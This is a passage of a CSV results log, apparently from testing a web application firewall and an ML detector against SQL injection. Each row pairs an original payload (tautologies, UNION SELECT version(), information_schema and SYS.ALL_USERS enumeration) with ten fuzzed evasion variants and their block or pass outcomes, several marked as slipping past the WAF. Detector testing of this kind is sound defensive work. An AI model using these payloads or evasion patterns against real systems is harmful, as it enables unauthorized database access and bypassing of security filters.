Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
   (   seLecT DISTiNcT  (  USERNAME  )   fROm   (  SelEcT dIstINCT  (  USERNAME  )  , ROWNUM As LIMIT frOm
SYS.ALL_USERS  )   WHERE LIMIT   liKe /*Ja*/ (SelecT  Or (seleCt (sELEct (SEleCT (SELECT 'Xz_' LIKE 'Xz_'))) In ((seLECt ''<>'B')<>(sElEcT '+'<>'+(SELECT 1)'), and (sELECT 'm' LikE 'm') not like  and (SELect 'F' LiKE 'F'),(sElECT (seLect (SElECt  or 0x0)))))<>0x1d86)   )    )    aNd 'i'   LIkE   'i",2025-10-25T13:41:09.178276,403,403,both_correct
15,2025-10-25T13:41:27.559581," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",403,403,403,both_correct," sElecT * frOM users wheRe id   like 	 0x1 Or/**/""&  (  "" Or 'W' NOT LIKE 'W8'  =   AND 1 -- 1",2025-10-25T13:41:45.143795,403,403,both_correct," selEcT * frOm users WHere id   LIKE   0x1 OR ""&  (  "" or 'W' NOT LIKE 'W8'  =   anD 0x1 -- '3Y'<>'3YA',",2025-10-25T13:42:04.480087,403,403,both_correct," SELeCt * FROm users wheRE id   LIkE   0x1 oR ""& 	(  ""/**/oR 'W' NOT LIKE 'W8'  =   And 0x1 -- '3Y'<>'3YA',vS",2025-10-25T13:42:23.605480,403,403,both_correct," seLECt * From users WHERe id   like   0x1 OR ""&  (  "" or 'W' NOT LIKE 'W8'  =   AND 0x1 -- '3Y'<>'3YA',vS|",2025-10-25T13:42:43.037843,403,403,both_correct," sElECt * fROM users wHerE id   liKe   0x1 OR ""&  (  "" or 'W' not like 'W8'  =	/**/ aNd 0x1 -- '3Y'<>'3YA',vS|Jq",2025-10-25T13:43:01.687616,403,403,both_correct," SElect * fRoM users whERe id   liKE   0x1 oR ""&  (/*p&*/ "" OR 'W' not like 'W8'  = /**/ AnD 0x1 -- '3Y'<>'3YA',vS|Jq",2025-10-25T13:43:20.249059,403,403,both_correct," seLECT * frOm users WHERe id   lIKe
  0x1 OR ""&  (/*p&*/ "" OR 'W'/**/not like 'W8'   like  /**/ And 0x1 -- '3Y'<>'3YA',vS|JqNf",2025-10-25T13:43:38.232653,403,403,both_correct,"/**/sEleCT * FROM users WhERE id   lIKe   0x1 oR ""&  (/**/ "" or 'W'/**/not like 'W8'   LikE  /**/ anD 0x1 -- '3Y'<>'3YA',vS|JqNfS",2025-10-25T13:43:57.019126,403,403,both_correct,"/**/SeLECT * FrOM users wHere id   LIkE   0x1 or ""&  (/*B*/ "" or 'W'/**/not like 'W8'   lIkE    ANd 0x1
-- '3Y'<>'3YA',vS|JqNfS",2025-10-25T13:44:15.418189,403,403,both_correct,"/**/sELECt * fROM users whERE id   LIke   0x1 or ""&  (  "" or 'W'/**/not like 'W8'   LikE    aNd 0x1 -- '3Y'<>'3YA',vS|JqNfS9",2025-10-25T13:44:33.382517,403,403,both_correct
16,2025-10-25T13:44:52.112183, )   or   (  'a'  =  'a,403,200,200,both_incorrect," )   Or /*~o*/	(  'a'   like   'a",2025-10-25T13:45:09.390038,200,403,waf_incorrect_ml_correct," )  /**/or
/*q
(HV*/	(  'a'   liKe   'a",2025-10-25T13:45:28.321757,200,403,waf_incorrect_ml_correct," )/**/
/**/OR
/*q
(HV*/	(  'a'   lIke   'a",2025-10-25T13:45:46.232132,200,403,waf_incorrect_ml_correct," )/**/
/**/or
/*q
(HV*/	( /**/'a'   LIke
  'a",2025-10-25T13:46:04.812681,200,403,waf_incorrect_ml_correct," )/**/
/**/or
/*q
(HV*/ ( /**/'a'   LIkE
 /**/'a",2025-10-25T13:46:23.034263,200,403,waf_incorrect_ml_correct," )/**/
/**/oR
/*q
(HV*/	( /**/'a'   like
/**//**/'a",2025-10-25T13:46:41.915555,200,403,waf_incorrect_ml_correct,"/**/)/**/
/**/Or	/*q
(HV*/	( /**/'a'   Like
/**//**/'a",2025-10-25T13:47:07.961792,200,403,waf_incorrect_ml_correct,"/**/)/**/  or	/*q
(HV*/	( /**/'a'   LIKe
/**//**/'a",2025-10-25T13:47:23.658717,200,403,waf_incorrect_ml_correct,"/**/)/**//**/ or	/*q
(HV*/	( /**/'a'   liKE	/**//*W&'*/'a",2025-10-25T13:47:42.021582,200,403,waf_incorrect_ml_correct,"/**/)/**//**/ Or	/*q
(HV*/ ( /**/'a'   LiKe	 /*W&'*/'a",2025-10-25T13:47:59.737530,200,403,waf_incorrect_ml_correct
17,2025-10-25T13:48:18.257142," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",403,403,403,both_correct," selECT * FROm users wHERe id  =  (sEleCt 1) OR ""%{""/**/OR (sELeCt 1) 
 LIke   1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:48:35.772742,403,403,both_correct," seLecT * FrOm users WHERE/**/id  =  (sELeCt 'nc	' LIKE 'nc ') Or ""%{""/*%C L*/or (SElECT (SELECT 1)) 
 liKe   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:48:54.605323,403,403,both_correct," selEcT * FROm users WhErE id   like   (SELEcT 'nc	' LIke 'nc ') OR ""%{""/*e)W*/or (seLEcT (SeLECT (selECT  AND 1241!=1242))) 	 like   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:49:12.358776,403,403,both_correct," sElECT * FROM users wheRE id/**/  liKe   (sELEct 'nc
' lIkE 'nc ') OR ""%{""/*e)W*/Or (seLeCT (SeLect (sELEct  and  OR 'gu'!='gu{' NOT LIKE 0x4da))) 	 likE   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:49:30.838232,403,403,both_correct," seLeCT * From
users WhERe id   like   (sElECt 'nc
' likE 'nc ') || ""%{""/*e)W*/oR (SeLeCt (seleCt (sElect  ANd  oR 'gu'!='gu{' NOT LIKE 0x4da))) 	 lIKe   0x1 -- '#r}T8'!='#r}T8W'8Y",2025-10-25T13:49:49.445234,403,403,both_correct," SELecT * FROM
users WHerE id  /*D1	r*/LiKE   (sELeCt 'nc
' like 'nc ')  Or  ""%{""/*e)W*/OR (seLecT (sElecT (selecT  AND
 Or 'gu'!='gu{' NOT LIKE 0x4da))) 	 LIkE   0x1 -- '#r}T8'!='#r}T8W'8Y",2025-10-25T13:50:07.781948,403,403,both_correct," SeLEct * FrOm
users wHERE id  /**/liKE   (SELEct 'nc
' LiKE 'nc ')/**/ Or  ""%{""/*e)W*/|| (SELEct (seLECT (SeLEcT  ANd
 Or 'gu'!='gu{' NOT LIKE 0x4da))) 	 LIKE   0x1 -- '#r}T8'!='#r}T8W'8Y$'",2025-10-25T13:50:27.013208,403,403,both_correct," seLEct * FROM
users wheRE id  /**/LIKE   (SEleCT 'nc
' LIKe 'nc ')  OR  ""%{""/*e)W*/|| (SELEcT
(sELECT (SeLect  aNd
 or 'gu' not like 'gu{' NOT LIKE 0x4da))) 	 liKE   0x1 -- '#r}T8'!='#r}T8W'8Y$'k",2025-10-25T13:50:45.569201,403,403,both_correct," selECT * From
users where id  /**/liKe   (seLect 'nc ' lIKe 'nc ') /**/oR  ""%{""/*e)W*/|| (SELecT
(seleCt (sELeCT  AnD
 Or 'gu' not like 'gu{' not like 0x4da))) 	 like   0x1 -- '#r}T8'!='#r}T8W'8Y$'kH",2025-10-25T13:51:03.825498,403,403,both_correct," SELeCT * FrOm
users whErE id  /**/LiKE   (selEcT 'nc ' LIke 'nc ')  Or  ""%{""/*e)W*/ OR  (sELEct
(seLeCT (sELEcT  aNd
 OR 'gu' not like 'gu{' not like 0x4da))) 	 lIKE	  0x1 -- '#r}T8'!='#r}T8W'8Y$'kHG,",2025-10-25T13:51:22.010371,403,403,both_correct
18,2025-10-25T13:51:40.802875, or 3  =  3 --,403,200,403,waf_incorrect_ml_correct," OR  AND 'IU}' LIKE 'IU}'  /**/like	  3 --",2025-10-25T13:51:58.653426,200,403,waf_incorrect_ml_correct," or  AnD 'IU}' LIkE 'IU}' 	 lIKE	  (SElecT 0x1) --",2025-10-25T13:52:19.576902,200,200,both_incorrect," OR  AND/**/'IU}' LIKE 'IU}' 	 LIke
  (SeLecT 0x1) --",2025-10-25T13:52:39.728137,403,403,both_correct," or  aND 'IU}' lIKe 'IU}' 
 LIKe
  (selEcT 0x1) --",2025-10-25T13:52:58.178427,403,200,waf_correct_ml_incorrect," oR  and
'IU}' lIke 'IU}' 
/**/LIke
  (SELect 0x1) --",2025-10-25T13:53:16.235904,403,403,both_correct," or/**/ and
'IU}' LIKe 'IU}' 
/*R*/lIkE   (sElECT 0x1) --",2025-10-25T13:53:35.134016,200,403,waf_incorrect_ml_correct," OR/**/ AnD	'IU}' lIKE 'IU}' 
/*n*/LiKe  /**/(selEct 0x1) --",2025-10-25T13:53:53.723344,200,403,waf_incorrect_ml_correct," oR  and 'IU}' Like 'IU}' 
/*n*/LiKE  /**/(SElecT 0x1) --",2025-10-25T13:54:12.089158,200,403,waf_incorrect_ml_correct," or  anD 'IU}' Like 'IU}' 
/**/LiKe
  (seLeCT 0x1) --",2025-10-25T13:54:31.407181,403,403,both_correct," OR  and 'IU}' lIke 'IU}' 
 likE
  (seLect 0x1)	--",2025-10-25T13:54:49.948833,403,200,waf_correct_ml_incorrect
19,2025-10-25T13:55:09.055868,%27 or 1  =  1,403,403,403,both_correct,"%(SElECT 27) Or	(SElect 8583!=8584)   lIKE/**/  1",2025-10-25T13:55:26.414009,403,403,both_correct,%(SeLecT  Or 0) Or (seleCt 3837 NOT LIKE 3838<>8584)   lIkE   (SELECt 1),2025-10-25T13:55:45.787096,403,200,waf_correct_ml_incorrect,"%(SELEct  oR '~''!='~'4') or (sEleCT 3837 NOT LIKE (SElect/*L*/1)!=8584)  
liKe   (SELEct (SELECT 1))",2025-10-25T13:56:05.848246,403,403,both_correct,"%(SelECT  OR '~''!='~' AND 1') oR (SELECt 1566 lIKe 1566 not like (SELECT/*Z*/0x1)!=8584)  	liKE /**/ (SeLecT (SElEcT 1))",2025-10-25T13:56:23.976705,403,403,both_correct,"%(sElECT /**/oR '~''!='~'
AND 1') or (selECT 'h'='h' LIke 1566 not like (SELEcT/**/0x1) not like (sEleCt 8584))  	LIKe /**/ (sElECt (SElecT  Or 0))",2025-10-25T13:56:42.532933,403,403,both_correct,"%(SElEcT /**/OR '~''!='~' AND 1') oR (sElECt 'h' liKE 'h' LIke 'L	'='L	'/**/not like (SEleCt/**/0x1) not like (SeLECT 0x2188))  	LiKE /**/ (select (SeLect  OR (SELECT 1)))",2025-10-25T13:57:00.617762,403,403,both_correct,"%(SELECT /**/oR '~''!='~' AND '='<>'=v'') oR (sElEct 'h' LIKE	'h' LIkE 'L	'='L	'/**/not like (SElECt/*
5:GR*/0x1) not like (seLEcT 0x2188))  	likE /**/ (SelEcT (SelECt  Or (SELECt  AND/**/0x1)))",2025-10-25T13:57:19.286629,403,403,both_correct,"%(SElEcT /**/oR '~''!='~' AND '='<>'=v'') || (SELEcT 8137 in (8136,(SELECT 1),8138) lIke 'L	'='L	'/**/not	like (sElEct/*
0x5:GR*/0x1) not like (sELecT 0x2188))  	like   (sELect (selECT  or (sELeCT  aND/**/0x1)))",2025-10-25T13:57:37.676467,403,403,both_correct,"%(SeLeCT /* */Or '~''!='~' AND ' liKe '<>'=v'') || (select 'V'='V' in (0x1fc8,(SELECt 1), and 1) lIKe 'L
'='L	' not	like (SeleCt/*
0x5:GR*/0x1) not like (sELEct 0x2188))  	lIKe   (SElECt (SElECt  Or (SeLect  anD/**/0x1)))",2025-10-25T13:57:57.219529,403,403,both_correct,"%(SElecT /* */oR '~''!='~' AND ' LikE '<>'=v'')/**/|| (selECt 'V'='V' in (0x1fc8,(Select (SELECT 1)), anD  AND '1B' NOT LIKE '1BJ') LiKE 'L
' like 'L	' not	like (SEleCT/**/0x1) not like (SELECT 0x2188))  	Like   (SeLEct (seLEcT  OR (SElEct	 and/**/0x1)))",2025-10-25T13:58:15.656096,403,403,both_correct
20,2025-10-25T13:58:34.070421," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",403,403,403,both_correct," sELEcT
* fROM users WherE id  =  (SElECT 0x1) or ""$["" Or 'k""~kr'<>'k""~krL' /**/=  1 -- 1",2025-10-25T13:58:51.602622,403,403,both_correct," SelecT
* fROM users whERE/**/id  =  (selecT 0x1) OR ""$["" or 'k""~kr'!='k""~krL' /**/= 	(selECt 1) --  OR 'D' NOT LIKE 'Dj'",2025-10-25T13:59:10.836627,403,403,both_correct," Select
* frOM users wHERe/**/id  =  (SeLeCt 0x1) Or ""$["" or 'k""~kr' not like 'k""~krL'  =  (SEleCt 0xc43!= OR 0) --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T13:59:31.209459,403,403,both_correct," SelEct	* frOm users Where id  =  (SeleCt 0x1) Or ""$["" Or 'k""~kr' not like 'k""~krL'  =  (sEleCT 0xc43 not like  OR 'o'<>'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T13:59:49.991648,403,403,both_correct," sElecT	* froM users WHerE id   liKe /*Rz*/ (SeLECt 0x1) Or ""$["" OR 'k""~kr' not like 'k""~krL'  =	 (SELeCT 0xc43 not like  oR 'o'<>'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T14:00:08.410356,403,403,both_correct," SELeCt	* fROm users/**/WHEre id   lIke /*a1Ze*/ (SElECt 0x1) Or ""$["" Or 'k""~kr'
not like 'k""~krL'  =	 (SelEct 0xc43 not like  Or 'o' not like 'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T14:00:27.152314,403,403,both_correct," SeLECt	* FRoM users/**/wHeRE id   lIKE   (seLecT 0x1) oR ""$["" Or 'k""~kr'
not like 'k""~krL'   LIke 	 (sElEcT 0xc43 not like  oR 'o' not like	'o?') --  OR 'D' NOT LIKE 'Dj'Ke",2025-10-25T14:00:46.233098,403,403,both_correct," SELecT	* fROM users WHere id   LikE   (SeLeCt 0x1) oR ""$["" or 'k""~kr'
not like 'k""~krL'   Like 	 (SELEcT 0xc43 not like  or 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:03.790218,403,403,both_correct," sELeCt	* From users WHere id   like   (SELEct 0x1) OR ""$[""/**/OR 'k""~kr'
not like 'k""~krL' 
 LIke 	 (sELecT 0xc43 not like  oR 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:23.228192,403,403,both_correct," sElecT * FrOm users WheRE id   lIkE   (seLECT 0x1) OR ""$["" oR 'k""~kr'
not like 'k""~krL' 
 LIKe 	 (sELEcT 0xc43 not like  or 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:41.673567,403,403,both_correct
21,2025-10-25T14:02:00.283059," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",403,403,403,both_correct," SELEcT * fRoM users WheRE id  
LiKe   (SELECT 1) OR ""?/**/ (  "" or  or 0  =  1 -- 676!=677E>",2025-10-25T14:02:17.294550,403,403,both_correct," SElECT * fROm users WHerE id   lIKE   (SELeCt (selEct 1)) || ""?  (  "" OR  OR  oR 0  =  1 -- '''!=''M'!=677E>=",2025-10-25T14:02:36.581308,403,403,both_correct," sElect */**/frOm users WHEre id   lIKE	  (SElect (selecT 1)) || ""?  (  "" or  OR  or (SeleCt 6660) not like 6661  =  (selECT 1) -- '''!=''M'!=677E>=w",2025-10-25T14:02:55.587010,403,403,both_correct," seleCT * From users WHeRe id   LiKe
  (SeLecT (SElECT  AND 1))  OR  ""?  (  "" OR  oR  or (sEleCT 6660) not like (SElECt '%/n5' LIKE '%/n5')  =  (seLecT 1) -- '''!=''M'!=677E>=w6/",2025-10-25T14:03:15.293733,403,403,both_correct," SELEcT * fRom users WHERe id   LIKe	  (select (sELEcT  And 'ry'<>'ryj'))  oR  ""? /*`k,*/(  "" oR  ||  or (SELecT (SELECT 0x1)) not like (seLECT '%/n5' LIkE '%/n5')  =  (seleCT 1) -- '''!=''M'!=677E>=w6/",2025-10-25T14:03:33.519419,403,403,both_correct," seLecT * fRom users wHeRE id   LIKe	  (sELECT (SELEcT  AND 'ry'!='ryj'))  Or  ""?  (  "" Or  ||  Or (seLect (selEct 0x1)) not like (seLEcT '%/n5' lIkE '%/n5')
 =  (seLecT (selEct 6057)<> ANd 1) -- '''!=''M'!=677E>=w6/e1",2025-10-25T14:03:53.264369,403,403,both_correct," seleCt * from users whERE id   likE
  (seLEcT (sEleCt  aNd 'ry'!='ryj'))  or  ""?  (  "" Or  ||  or (sElect (seLect 0x1)) not like (selEcT '%/n5' LiKe '%/n5')
  lIKE   (sElEct (seLeCT 4652!=4653)<> And  AND 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:15.022603,403,403,both_correct," SeLEcT/**/* fROM users wHEre id   liKe
  (SeLeCT (sELECt  aND	'ry'!='ryj'))  oR  ""?  (  "" oR  ||  Or (sELECT (seLECt 0x1)) not like (SELecT '%/n5' lIkE '%/n5')
  LIkE   (SeLecT (SelECt (sELECt 9513 LIKE 9513)!=(selEcT 4653))<> aND  ANd 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:32.807648,403,403,both_correct," seleCt/**/* FRom users WheRe id   likE
  (SelEcT (SEleCt  and	'ry'!='ryj'))  Or  ""?  (  "" Or   OR   Or (sElecT (SelEcT 0x1))
not like (seLect '%/n5' lIKE '%/n5')
  likE/**/  (SElECt (sELEcT (sElEcT  aNd (SELECT 1) LiKE ')' liKe ')')!=(sELeCt 4653))<> and  ANd 0x1) --/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:04:54.353545,403,403,both_correct," SELect * From users Where id   LIKe
  (SEleCT (sElecT  aND	'ry'!='ryj'))  oR  ""?  (  "" OR   oR   oR (SelECT (SELECt 0x1))
not like (select '%/n5' lIke '%/n5')
  LikE/**/  (SelECT (SELEcT (SeLeCt  AnD (sELECT  OR 6210 LIKE 6210) LikE ')' lIKE ')')!=(SelEct 0x122d))!= aNd  And 0x1)	--/**/'''!=''M'!=677E>=w6/e1",2025-10-25T14:05:13.327351,403,403,both_correct
22,2025-10-25T14:05:32.172792, select * from information_schema.tables--,403,403,200,waf_correct_ml_incorrect," seLeCT */* */FRoM
information_schema.tables--",2025-10-25T14:05:49.962357,403,403,both_correct,"	SELECt * FrOm
information_schema.tables--",2025-10-25T14:06:10.191807,403,200,waf_correct_ml_incorrect,"	SElECT/**/* From	information_schema.tables--",2025-10-25T14:06:29.258163,403,403,both_correct,"	SElect/**/*
FRoM	information_schema.tables--",2025-10-25T14:06:48.031776,403,403,both_correct,"	SElECt *
FROm information_schema.tables--",2025-10-25T14:07:06.786544,403,200,waf_correct_ml_incorrect,"	SeLECT/**/*
frOm	information_schema.tables--",2025-10-25T14:07:24.079896,403,403,both_correct,"	SELECT/*Kqpat*/*/**/frOm	information_schema.tables--",2025-10-25T14:07:41.209330,403,403,both_correct,"	SElECt/*)Ld*/*
frOM	information_schema.tables--",2025-10-25T14:07:58.619524,403,403,both_correct,"/*E}KD*/sEleCt/*)Ld*/*
fRom	information_schema.tables--",2025-10-25T14:08:16.485141,403,403,both_correct,"/*[i;*/sELEcT/*)Ld*/* fRom	information_schema.tables--",2025-10-25T14:08:33.596414,403,403,both_correct
23,2025-10-25T14:08:51.278659," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",403,403,200,waf_correct_ml_incorrect," sElECt * From users wHEre id   like   '7797<> AND 1' %!<@ union SeLEcT	0x1,version  (    ) /**/ -- 1'C",2025-10-25T14:09:07.203923,403,403,both_correct," seleCt * fROM users WhErE id   LIKE   '7797<> AND 9385 IN (9384,9385,9386)' %!<@ union sElect
0x1,version  (    ) /**/ --/**/(SELECT (SELECT 1))'C",2025-10-25T14:09:26.336801,403,403,both_correct," SeleCt * FROM users WheRe id   LikE   '7797<> AND 9385 IN (9384, OR 'P}Z' NOT LIKE 'P}ZP',0x24aa)' %!<@ union Select 0x1,version  (    ) /**/ -- (SELECT (SELECT 1))'C",2025-10-25T14:09:44.498264,403,403,both_correct," seLect * from users whERe id   liKe   ''-' LIKE '-'<> AND (SELECT  AND 1) IN (9384, OR 'P}Z'
NOT LIKE 'P}ZP',0x24aa)' %!<@ union SElECT 0x1,version  (    )   -- (SELECT (SELECT 1))'C",2025-10-25T14:10:01.905334,403,403,both_correct," SeleCt * FroM users wHerE id   liKE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 1)) IN (9384, OR/*S*/'P}Z'
NOT LIKE 'P}ZP',0x24aa)' %!<@ union SELEcT
0x1,version  (    )   -- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'C",2025-10-25T14:10:19.410898,403,403,both_correct," seLECt * FroM users wherE id   LIke   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 3662 LIKE 3662, OR 'P}Z'
NOT LIKE 'P}ZP',0x24aa)' %!<@ union sEleCt
0x1,version  (    )  
-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:10:37.597927,403,403,both_correct," SelecT * fROm users WhERe/*[7500!=7501*/id   LIkE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 1, OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union sELeCt
0x1,version  (    )  
-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:10:54.928569,403,403,both_correct," SElECt * fRom users wHErE id   liKE   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 0x2a0=(SELECT 1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SElECt 0x1,version  (    )  
-- (SELECT (SELECT (SELECT '&+>'<>'&+>v')))'Cg",2025-10-25T14:11:12.441315,403,403,both_correct," select * FRom users WherE id   Like  /**/''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND 0x2a0=(SELECT 0x1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SEleCt 0x1,version  (    )  
--
